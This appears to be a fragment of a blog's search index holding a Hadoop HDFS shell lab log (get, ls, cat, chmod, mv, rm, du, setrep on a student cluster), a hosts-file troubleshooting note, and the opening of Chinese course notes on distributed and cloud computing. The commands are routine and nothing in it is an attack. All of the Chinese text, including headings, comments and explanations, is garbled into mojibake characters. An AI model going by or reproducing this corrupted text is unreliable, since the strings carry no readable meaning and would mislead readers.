huang   4096 6æœˆ  28 12:13 wcinput</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6æœˆ  30 13:56 weiguo.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang      6 6æœˆ  30 13:58 wuguo.txt</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi shuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-get ç­‰åŒäºcopyToLocalï¼Œç”Ÿäº§ç¯å¢ƒæ›´å–œæ¬¢ç”¨get</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -get /sanguo/shuguo.txt ./shuguo2.txt </span><br><span class="line">2021-06-30 14:05:26,350 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">æ€»ç”¨é‡ 232</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9æœˆ  12 2019 bin</span><br><span class="line">drwxrwxr-x. 4 huang huang   4096 6æœˆ  28 11:54 data</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9æœˆ  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9æœˆ  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9æœˆ   4 2019 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6æœˆ  30 13:59 liubei.txt</span><br><span class="line">drwxrwxr-x. 3 huang huang   4096 6æœˆ  29 20:38 logs</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9æœˆ   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9æœˆ   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9æœˆ  12 2019 share</span><br><span class="line">-rw-r--r--. 1 huang huang     14 6æœˆ  30 14:05 shuguo2.txt</span><br><span class="line">-rw-r--r--. 1 huang huang     14 6æœˆ  30 14:01 shuguo.txt</span><br><span class="line">drwxrwxr-x. 2 huang huang   4096 6æœˆ  28 12:13 wcinput</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6æœˆ  30 13:56 weiguo.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang      6 6æœˆ  30 13:58 wuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">ls</span> æ˜¾ç¤ºç›®å½•ä¿¡æ¯</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -ls /sanguo</span><br><span class="line">Found 3 items</span><br><span class="line">-rw-r--r--   3 huang supergroup         14 2021-06-30 14:00 /sanguo/shuguo.txt</span><br><span class="line">-rw-r--r--   3 huang supergroup          7 2021-06-30 13:57 /sanguo/weiguo.txt</span><br><span class="line">-rw-r--r--   3 huang supergroup          6 2021-06-30 13:58 /sanguo/wuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">cat</span> æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -cat /sanguo/wuguo.txt</span><br><span class="line">2021-06-30 14:06:27,858 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">wuguo</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">chgrp</span>ï¼Œ-<span class="built_in">chmod</span>ï¼Œ-<span class="built_in">chown</span>ï¼šlinuxæ–‡ä»¶ç³»ç»Ÿä¸­çš„ç”¨æ³•ä¸€æ ·ï¼Œä¿®æ”¹æ–‡ä»¶æ‰€å±æƒé™</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -chmod 666 /sanguo/shuguo.txt</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -chown huang:huang /sanguo/shuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">mkdir</span> åˆ›å»ºè·¯å¾„</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -mkdir /jinguo</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">cp</span> ä»HDFSçš„ä¸€ä¸ªè·¯å¾„æ‹·è´åˆ°HDFSçš„å¦ä¸€ä¸ªè·¯å¾„</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -cp /sanguo/shuguo.txt /jinguo</span><br><span class="line">2021-06-30 14:09:11,407 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">2021-06-30 14:09:11,512 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">mv</span> åœ¨HDFSç›®å½•ä¸­ç§»åŠ¨æ–‡ä»¶</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -mv /sanguo/wuguo.txt /jinguo</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -mv /sanguo/weiguo.txt /jinguo</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">tail</span> æ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶çš„æœ«å°¾1kbçš„æ•°æ®</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -tail /jinguo/shuguo.txt</span><br><span class="line">2021-06-30 14:11:43,198 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">shuguo</span><br><span class="line">liubei</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">rm</span> åˆ é™¤æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -rm /sanguo/shuguo.txt</span><br><span class="line">Deleted /sanguo/shuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">rm</span> -r é€’å½’åˆ é™¤ç›®å½•åŠç›®å½•é‡Œé¢å†…å®¹</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -rm -r /sanguo</span><br><span class="line">Deleted /sanguo</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">du</span> ç»Ÿè®¡æ–‡ä»¶å¤¹çš„å¤§å°ä¿¡æ¯</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -du -s -h /jinguo</span><br><span class="line">27  81  /jinguo</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -du -h /jinguo</span><br><span class="line">14  42  /jinguo/shuguo.txt</span><br><span class="line">7   21  /jinguo/weiguo.txt</span><br><span class="line">6   18  /jinguo/wuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-setrep è®¾ç½®HDFSä¸­æ–‡ä»¶çš„å‰¯æœ¬æ•°é‡</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è¿™é‡Œå¾—çœ‹DataNodeçš„æ•°é‡ï¼Œå› ä¸ºç›®å‰åªæœ‰3å°è®¾å¤‡ï¼Œæœ€å¤šå°±3ä¸ªå‰¯æœ¬ï¼Œåªæœ‰èŠ‚ç‚¹æ•°å¢åŠ åˆ°10å‰¯æœ¬æ•°æ‰èƒ½è¾¾åˆ°10</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -setrep 10 /jinguo/shuguo.txt</span><br><span class="line">Replication 10 set: /jinguo/shuguo.txt</span><br></pre></td></tr></table></figure>

<h2 id="ä¸‰ã€å®éªŒç»“æœ"><a href="#ä¸‰ã€å®éªŒç»“æœ" class="headerlink" title="ä¸‰ã€å®éªŒç»“æœ"></a>ä¸‰ã€å®éªŒç»“æœ</h2><p>é€šè¿‡webç«¯å¯ä»¥æŸ¥çœ‹åˆ°åˆ›å»ºçš„æ–‡ä»¶å¤¹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220106739.png" alt="image-20210630143235900"></p>
<p>è¿™ä¸ªä¹Ÿå¯ä»¥shuguo.txtçš„å‰¯æœ¬æ•°ä¸º10:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220106740.png" alt="image-20210630143324158"></p>
<p>æ–‡ä»¶ä¿¡æ¯ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220106741.png" alt="image-20210630143802614"></p>
<h2 id="å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•"><a href="#å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•" class="headerlink" title="å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•"></a>å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•</h2><h3 id="Hadoop102-9870-è®¿é—®ä¸äº†"><a href="#Hadoop102-9870-è®¿é—®ä¸äº†" class="headerlink" title="Hadoop102:9870 è®¿é—®ä¸äº†"></a>Hadoop102:9870 è®¿é—®ä¸äº†</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220106742.png" alt="image-20210630144104874"></p>
<p>åå¤æ’æŸ¥åï¼Œå‘ç°ä¸»æœºmacä¸Šçš„hostsè®¾ç½®é”™äº†ï¼Œå€’æ˜¯hadoop102å¯¹åº”çš„ipæ‰¾ä¸åˆ°ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<p>é‡æ–°è®¾ç½®hostså³å¯</p>
]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ†å¸ƒå¼ä¸äº‘è®¡ç®—</title>
    <url>/2021/06/21/ustc/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%8E%E4%BA%91%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<h1 id="åˆ†å¸ƒå¼ä¸äº‘è®¡ç®—"><a href="#åˆ†å¸ƒå¼ä¸äº‘è®¡ç®—" class="headerlink" title="åˆ†å¸ƒå¼ä¸äº‘è®¡ç®—"></a>åˆ†å¸ƒå¼ä¸äº‘è®¡ç®—</h1><h1 id="Chapter-1-æ¦‚è¿°"><a href="#Chapter-1-æ¦‚è¿°" class="headerlink" title="Chapter 1 æ¦‚è¿°"></a>Chapter 1 æ¦‚è¿°</h1><h2 id="åˆ†å¸ƒå¼ç³»ç»Ÿçš„å®šä¹‰"><a href="#åˆ†å¸ƒå¼ç³»ç»Ÿçš„å®šä¹‰" class="headerlink" title="åˆ†å¸ƒå¼ç³»ç»Ÿçš„å®šä¹‰"></a>åˆ†å¸ƒå¼ç³»ç»Ÿçš„å®šä¹‰</h2><blockquote>
<p>åˆ†å¸ƒå¼ç³»ç»Ÿæ˜¯è‹¥å¹²ç‹¬ç«‹è®¡ç®—æœºçš„é›†åˆï¼Œè¿™äº›è®¡ç®—æœºå¯¹äºç”¨æˆ·æ¥è¯´å°±åƒæ˜¯å•ä¸ªç›¸å…³çš„ç³»ç»Ÿã€‚</p>
</blockquote>
<p>ä¸ºäº†ä½¿ç§ç±»å„å¼‚çš„è®¡ç®—æœºå’Œç½‘ç»œéƒ½å‘ˆç°ä¸ºå•ä¸ªçš„ç³»ç»Ÿï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿå¸¸å¸¸é€šè¿‡ä¸€ä¸ªâ€è½¯ä»¶å±‚â€ç»„ç»‡èµ·æ¥ï¼Œè¯¥â€è½¯ä»¶å±‚â€åœ¨é€»è¾‘ä¸Šä½äºæœ‰ç”¨æˆ·å’Œåº”ç”¨ç¨‹åºç»„æˆçš„é«˜å±‚ä¸æœ‰æ“ä½œç³»ç»Ÿç»„æˆçš„ä½å±‚ä¹‹é—´ã€‚è¿™æ ·çš„åˆ†å¸ƒå¼ç³»ç»Ÿåˆç§°ä¸º**ä¸­é—´ä»¶(middleware)**ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451738.png" alt="ä¸­é—´ä»¶"></p>
<h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h2><h3 id="ä½¿èµ„æºå¯è®¿é—®"><a href="#ä½¿èµ„æºå¯è®¿é—®" class="headerlink" title="ä½¿èµ„æºå¯è®¿é—®"></a>ä½¿èµ„æºå¯è®¿é—®</h3><p>åˆ†å¸ƒå¼ç³»ç»Ÿæœ€<strong>ä¸»è¦</strong>çš„ç›®æ ‡æ˜¯ä½¿ç”¨æˆ·èƒ½å¤Ÿæ–¹ä¾¿åœ°è®¿é—®è¿œç¨‹èµ„æºï¼Œå¹¶ä¸”ä»¥ä¸€ç§å—æ§çš„æ–¹å¼ä¸å…¶ä»–ç”¨æˆ·å…±äº«è¿™äº›èµ„æºã€‚</p>
<h3 id="é€æ˜æ€§"><a href="#é€æ˜æ€§" class="headerlink" title="é€æ˜æ€§"></a>é€æ˜æ€§</h3><p>åˆ†å¸ƒå¼ç³»ç»Ÿçš„<strong>é‡è¦</strong>ç›®æ ‡ä¹‹ä¸€æ˜¯å°†å®ƒçš„è¿›ç¨‹å’Œèµ„æºå®é™…ä¸Šåœ¨å¤šå°è®¡ç®—æœºä¸Šåˆ†å¸ƒè¿™æ ·ä¸€ä¸ªäº‹å®éšè—èµ·æ¥ã€‚å¦‚æœä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿåœ¨ç”¨æˆ·å’Œåº”ç”¨ç¨‹åºé¢å‰å‘ˆç°ä¸ºå•ä¸ªè®¡ç®—æœºç³»ç»Ÿï¼Œè¿™æ ·çš„åˆ†å¸ƒå¼ç³»ç»Ÿå°±ç§°ä¸ºæ˜¯<strong>é€æ˜çš„</strong>ã€‚</p>
<h4 id="é€æ˜çš„ç±»å‹"><a href="#é€æ˜çš„ç±»å‹" class="headerlink" title="é€æ˜çš„ç±»å‹"></a>é€æ˜çš„ç±»å‹</h4><ul>
<li>è®¿é—®é€æ˜æ€§ï¼šå¯¹ä¸åŒæ•°æ®è¡¨ç¤ºå½¢å¼ä»¥åŠèµ„æºè®¿é—®æ–¹å¼çš„éšè—ï¼›</li>
<li>ä½ç½®é€æ˜æ€§ï¼šç”¨æˆ·æ— æ³•åˆ¤åˆ«èµ„æºåœ¨ç³»ç»Ÿä¸­çš„ç‰©ç†ä½ç½®ï¼›</li>
<li>è¿ç§»é€æ˜æ€§ï¼šå¦‚æœåˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„èµ„æºç§»åŠ¨ä¸ä¼šå½±å“è¯¥èµ„æºçš„è®¿é—®æ–¹å¼ï¼Œå°±å¯ä»¥è¯´è¿™ç§åˆ†å¸ƒå¼ç³»ç»Ÿèƒ½æä¾›ï¼›</li>
<li>é‡å®šä½é€æ˜æ€§ï¼šå¦‚æœèµ„æºå¯ä»¥åœ¨æ¥å—è®¿é—®çš„åŒæ—¶è¿›è¡Œé‡æ–°å®šä½ï¼Œè€Œä¸å¼•èµ·ç”¨æˆ·å’Œåº”ç”¨ç¨‹åºçš„æ³¨æ„ï¼Œæ‹¥æœ‰è¿™ç§èµ„æºçš„ç³»ç»Ÿèƒ½æä¾›é‡å®šä½é€æ˜æ€§ã€‚</li>
<li>å¤åˆ¶é€æ˜æ€§ï¼šå¯¹åŒä¸€ä¸ªèµ„æºå­˜åœ¨å¤šä¸ªå‰¯æœ¬è¿™æ ·ä¸€ä¸ªäº‹å®çš„éšè—ï¼›</li>
<li>å¹¶å‘é€æ˜æ€§ï¼šéšè—èµ„æºæ˜¯å¦ç”±è‹¥å¹²ç›¸äº’ç«äº‰çš„ç”¨æˆ·å…±äº«è¿™ä¸€äº‹å®ï¼›</li>
<li>æ•…éšœé€æ˜æ€§ï¼šéšè—èµ„æºçš„æ•…éšœä¸æ¢å¤ã€‚</li>
</ul>
<h4 id="é€æ˜åº¦"><a href="#é€æ˜åº¦" class="headerlink" title="é€æ˜åº¦"></a>é€æ˜åº¦</h4><p>åœ¨è®¾è®¡å¹¶å®ç°åˆ†å¸ƒå¼ç³»ç»Ÿæ—¶ï¼ŒæŠŠå®ç°åˆ†å¸ƒçš„é€æ˜æ€§ä½œä¸ºç›®æ ‡æ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯åº”è¯¥å°†å®ƒå’Œå…¶ä»–æ–¹é¢çš„é—®é¢˜ï¼ˆæ¯”å¦‚æ€§èƒ½)ç»“åˆèµ·æ¥è€ƒè™‘ã€‚</p>
<h3 id="å¼€æ”¾æ€§"><a href="#å¼€æ”¾æ€§" class="headerlink" title="å¼€æ”¾æ€§"></a>å¼€æ”¾æ€§</h3><p>å¼€æ”¾å¼çš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼šæ ¹æ®ä¸€ç³»åˆ—å‡†åˆ™æ¥æä¾›æœåŠ¡ï¼Œè¿™äº›å‡†åˆ™æè¿°äº†æ‰€æä¾›æœåŠ¡çš„è¯­æ³•å’Œè¯­ä¹‰ã€‚</p>
<h3 id="å¯æ‰©å±•æ€§"><a href="#å¯æ‰©å±•æ€§" class="headerlink" title="å¯æ‰©å±•æ€§"></a>å¯æ‰©å±•æ€§</h3><p>ç³»ç»Ÿçš„å¯æ‰©å±•æ€§è‡³å°‘å¯ä»¥é€šè¿‡ä¸‰ä¸ªæ–¹é¢æ¥åº¦é‡ï¼š</p>
<ol>
<li>è§„æ¨¡å¯æ‰©å±•ï¼šå¯æ–¹ä¾¿å‘ç³»ç»Ÿé‡ŒåŠ å…¥æ›´å¤šç”¨æˆ·å’Œèµ„æºï¼›</li>
<li>åœ°åŸŸå¯æ‰©å±•ï¼šå¯ä½¿ç³»ç»Ÿä¸­çš„ç”¨æˆ·ä¸èµ„æºç›¸éš”ååˆ†é¥è¿œï¼›</li>
<li>ç®¡ç†å¯æ‰©å±•ï¼šå³ä½¿åˆ†å¸ƒå¼ç³»ç»Ÿè·¨è¶Šå¤šä¸ªç‹¬ç«‹çš„ç®¡ç†æœºæ„ï¼Œä»ç„¶å¯ä»¥æ–¹ä¾¿çš„å¯¹å…¶è¿›è¡Œç®¡ç†ã€‚</li>
</ol>
<h4 id="å¯æ‰©å±•æ€§é—®é¢˜"><a href="#å¯æ‰©å±•æ€§é—®é¢˜" class="headerlink" title="å¯æ‰©å±•æ€§é—®é¢˜"></a>å¯æ‰©å±•æ€§é—®é¢˜</h4><p>åˆ†å¸ƒå¼ç®—æ³•ï¼š</p>
<ol>
<li>æ²¡æœ‰ä»»ä½•è®¡ç®—æœºæ‹¥æœ‰æ•´ä¸ªç³»ç»Ÿçš„å…¨å±€ä¿¡æ¯ï¼›</li>
<li>è®¡ç®—æœºåªæ ¹æ®æœ¬åœ°ä¿¡æ¯åšå‡ºå†³ç­–ï¼›</li>
<li>æŸå°è®¡ç®—æœºçš„æ•…éšœä¸ä¼šä½¿ç®—æ³•å´©æºƒï¼›</li>
<li>ä¸å­˜åœ¨<strong>å…¨å±€æ—¶é’Ÿ</strong>ã€‚</li>
</ol>
<h4 id="æ‰©å±•æŠ€æœ¯"><a href="#æ‰©å±•æŠ€æœ¯" class="headerlink" title="æ‰©å±•æŠ€æœ¯"></a>æ‰©å±•æŠ€æœ¯</h4><h5 id="éšè—é€šä¿¡ç­‰å¾…æ—¶é—´"><a href="#éšè—é€šä¿¡ç­‰å¾…æ—¶é—´" class="headerlink" title="éšè—é€šä¿¡ç­‰å¾…æ—¶é—´"></a>éšè—é€šä¿¡ç­‰å¾…æ—¶é—´</h5><ol>
<li>ä½¿ç”¨<strong>å¼‚æ­¥é€šä¿¡</strong>ï¼Œé€šå¸¸ç”¨äºæ‰¹å¤„ç†ç³»ç»Ÿï¼›</li>
<li>å¯åŠ¨ä¸€ä¸ªæ–°çš„æ§åˆ¶çº¿ç¨‹æ¥æ‰§è¡Œè¯·æ±‚ã€‚</li>
</ol>
<p><strong>é—®é¢˜</strong>ï¼šæœ‰è®¸å¤šåº”ç”¨ç¨‹åºä¸é€‚ç”¨æ­¤æ–¹å¼ã€‚</p>
<h5 id="åˆ†å¸ƒæŠ€æœ¯"><a href="#åˆ†å¸ƒæŠ€æœ¯" class="headerlink" title="åˆ†å¸ƒæŠ€æœ¯"></a>åˆ†å¸ƒæŠ€æœ¯</h5><p>æŠŠæŸä¸ªç»„ä»¶åˆ†å‰²æˆå¤šä¸ªéƒ¨åˆ†ï¼Œç„¶åå†æŠŠä»–ä»¬åˆ†æ•£åˆ°ç³»ç»Ÿä¸­å»ã€‚</p>
<p>ä¾‹ï¼šDNSã€ä¸‡ç»´ç½‘WWW</p>
<h5 id="å¤åˆ¶æŠ€æœ¯"><a href="#å¤åˆ¶æŠ€æœ¯" class="headerlink" title="å¤åˆ¶æŠ€æœ¯"></a>å¤åˆ¶æŠ€æœ¯</h5><p>å¯¹ç»„ä»¶è¿›è¡Œå¤åˆ¶å¹¶å°†å‰¯æœ¬åˆ†å¸ƒåˆ°ç³»ç»Ÿå„å¤„ã€‚</p>
<p><strong>ç¼“å­˜</strong>æ˜¯å¤åˆ¶çš„ä¸€ç§ç‰¹æ®Šå½¢å¼ã€‚ç¼“å­˜ä¸€èˆ¬æ˜¯åœ¨è®¿é—®èµ„æºçš„å®¢æˆ·<strong>é™„è¿‘</strong>åˆ¶ä½œè¯¥èµ„æºçš„å‰¯æœ¬ã€‚</p>
<h2 id="åˆ†å¸ƒå¼ç³»ç»Ÿçš„ç±»å‹"><a href="#åˆ†å¸ƒå¼ç³»ç»Ÿçš„ç±»å‹" class="headerlink" title="åˆ†å¸ƒå¼ç³»ç»Ÿçš„ç±»å‹"></a>åˆ†å¸ƒå¼ç³»ç»Ÿçš„ç±»å‹</h2><h3 id="åˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿ"><a href="#åˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿ" class="headerlink" title="åˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿ"></a>åˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿ</h3><blockquote>
<p>ç”¨äºé«˜æ€§èƒ½è®¡ç®—ä»»åŠ¡çš„ç³»ç»Ÿã€‚</p>
</blockquote>
<h4 id="é›†ç¾¤è®¡ç®—ç³»ç»Ÿ"><a href="#é›†ç¾¤è®¡ç®—ç³»ç»Ÿ" class="headerlink" title="é›†ç¾¤è®¡ç®—ç³»ç»Ÿ"></a>é›†ç¾¤è®¡ç®—ç³»ç»Ÿ</h4><p>åº•å±‚ç¡¬ä»¶æ˜¯ç”±ç±»ä¼¼çš„å·¥ä½œç«™æˆ–PCé›†ç»„æˆï¼Œé€šè¿‡é«˜é€Ÿçš„å±€åŸŸç½‘ç´§å¯†è¿æ¥èµ·æ¥çš„ã€‚è€Œä¸”ï¼Œæ¯ä¸ªèŠ‚ç‚¹è¿è¡Œçš„æ˜¯ç›¸åŒçš„æ“ä½œç³»ç»Ÿã€‚</p>
<p>é›†ç¾¤è®¡ç®—ç³»ç»Ÿçš„ç‰¹ç‚¹æ˜¯åŒæ„æ€§ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œé›†ç¾¤ä¸­çš„è®¡ç®—æœºéƒ½æ˜¯ç›¸åŒçš„ï¼š</p>
<ul>
<li>æœ‰ç›¸åŒçš„æ“ä½œç³»ç»Ÿ</li>
<li>é€šè¿‡åŒä¸€ç½‘ç»œè¿æ¥</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451739.png" alt="é›†ç¾¤è®¡ç®—ç³»ç»Ÿä¸€ä¸ªç¤ºä¾‹"></p>
<h4 id="ç½‘æ ¼è®¡ç®—ç³»ç»Ÿ"><a href="#ç½‘æ ¼è®¡ç®—ç³»ç»Ÿ" class="headerlink" title="ç½‘æ ¼è®¡ç®—ç³»ç»Ÿ"></a>ç½‘æ ¼è®¡ç®—ç³»ç»Ÿ</h4><p>ç»„æˆåˆ†å¸ƒå¼ç³»ç»Ÿçš„å­åˆ†ç»„é€šå¸¸æ„å»ºæˆä¸€ä¸ªè®¡ç®—æœºç³»ç»Ÿè”ç›Ÿï¼Œæ¯ä¸ªç³»ç»Ÿå½’å±äºä¸åŒçš„ç®¡ç†åŸŸã€‚</p>
<p>ç½‘æ ¼è®¡ç®—ç³»ç»Ÿå…·æœ‰é«˜åº¦å¼‚æ„æ€§ï¼š</p>
<ul>
<li>ç¡¬ä»¶</li>
<li>æ“ä½œç³»ç»Ÿ</li>
<li>ç½‘ç»œ</li>
<li>ç®¡ç†åŸŸ</li>
<li>å®‰å…¨ç­–ç•¥</li>
</ul>
<p>éƒ½ä¸å°½ç›¸åŒã€‚</p>
<p>ä»¥<strong>è™šæ‹Ÿç»„ç»‡</strong>çš„æ–¹å¼ï¼ŒæŠŠæ¥è‡ªä¸åŒè®¡ç®—æœºç»„ç»‡çš„èµ„æºé›†ä¸­èµ·æ¥ï¼Œæ˜¯ä¸€ç»„äººæˆ–æœºæ„åè°ƒå·¥ä½œã€‚å±äºåŒä¸€è™šæ‹Ÿç»„ç»‡çš„äººï¼Œå…·æœ‰è®¿é—®æä¾›ç»™è¯¥ç»„ç»‡çš„èµ„æºçš„æƒé™ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451740.png" alt="ç½‘æ ¼è®¡ç®—ç³»ç»Ÿçš„åˆ†å±‚ä½“ç³»ç»“æ„"></p>
<p><strong>å…‰çº¤å±‚</strong>ï¼šåœ¨ç‰¹å®šç«™ç‚¹æä¾›å¯¹å±€éƒ¨èµ„æºçš„æ¥å£ã€‚è¿™äº›æ¥å£éƒ½è¿›è¡Œäº†å®šåˆ¶ï¼Œä»¥å…è®¸åœ¨æŸä¸ªè™šæ‹Ÿç»„ç»‡ä¸­å®ç°èµ„æºå…±äº«ã€‚</p>
<p><strong>è¿æ¥å±‚</strong>ï¼šç”±é€šä¿¡åè®®ç»„æˆï¼Œç”¨äºæ”¯æŒç½‘æ ¼äº‹åŠ¡å¤„ç†ï¼Œå»¶ä¼¸å¤šä¸ªèµ„æºçš„ä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œç”¨äºåœ¨èµ„æºä¹‹é—´ä¼ è¾“æ•°æ®æˆ–ä»è¿œç¨‹åœ°ç‚¹è®¿é—®èµ„æºçš„åè®®ã€‚å¦å¤–ï¼Œè¿æ¥å±‚è¿˜æœ‰å®‰å…¨åè®®ï¼Œç”¨äºè¿›è¡Œç”¨æˆ·å’Œèµ„æºçš„è®¤è¯ã€‚</p>
<p><strong>èµ„æºå±‚</strong>ï¼šè´Ÿè´£ç®¡ç†å•ä¸ªèµ„æºã€‚å®ƒä½¿ç”¨ç”±è¿æ¥å±‚æä¾›çš„åŠŸèƒ½ï¼Œç›´æ¥è°ƒç”¨å¯¹å…‰çº¿å±‚å¯ç”¨çš„æ¥å£ã€‚</p>
<p><strong>æ±‡é›†å±‚</strong>ï¼šè´Ÿè´£å¤„ç†å¯¹å¤šä¸ªèµ„æºçš„è®¿é—®ï¼Œé€šå¸¸ç”±èµ„æºåˆ†æ´¾ã€æŠŠä»»åŠ¡åˆ†é…å’Œè°ƒåº¦åˆ°å¤šèµ„æºä»¥åŠæ•°æ®å¤åˆ¶ç­‰æœåŠ¡ç»„æˆã€‚è¿æ¥å±‚å’Œèµ„æºå±‚ç”±ç›¸å¯¹è¾ƒå°ã€è¾ƒæ ‡å‡†çš„åè®®é›†ç»„æˆï¼Œè€Œæ±‡é›†å±‚ç”±å¾ˆå¤šç”¨äºä¸åŒç›®çš„çš„ä¸åŒåè®®ç»„æˆã€‚</p>
<p><strong>åº”ç”¨å±‚</strong>ï¼šç”±åº”ç”¨ç¨‹åºç»„æˆã€‚</p>
<h3 id="åˆ†å¸ƒå¼ä¿¡æ¯ç³»ç»Ÿ"><a href="#åˆ†å¸ƒå¼ä¿¡æ¯ç³»ç»Ÿ" class="headerlink" title="åˆ†å¸ƒå¼ä¿¡æ¯ç³»ç»Ÿ"></a>åˆ†å¸ƒå¼ä¿¡æ¯ç³»ç»Ÿ</h3><h3 id="åˆ†å¸ƒå¼æ™®é€‚ç³»ç»Ÿ"><a href="#åˆ†å¸ƒå¼æ™®é€‚ç³»ç»Ÿ" class="headerlink" title="åˆ†å¸ƒå¼æ™®é€‚ç³»ç»Ÿ"></a>åˆ†å¸ƒå¼æ™®é€‚ç³»ç»Ÿ</h3><h1 id="Chapter-2-ä½“ç³»ç»“æ„"><a href="#Chapter-2-ä½“ç³»ç»“æ„" class="headerlink" title="Chapter 2 ä½“ç³»ç»“æ„"></a>Chapter 2 ä½“ç³»ç»“æ„</h1><h2 id="ä½“ç³»ç»“æ„çš„æ ·å¼"><a href="#ä½“ç³»ç»“æ„çš„æ ·å¼" class="headerlink" title="ä½“ç³»ç»“æ„çš„æ ·å¼"></a>ä½“ç³»ç»“æ„çš„æ ·å¼</h2><p>æ 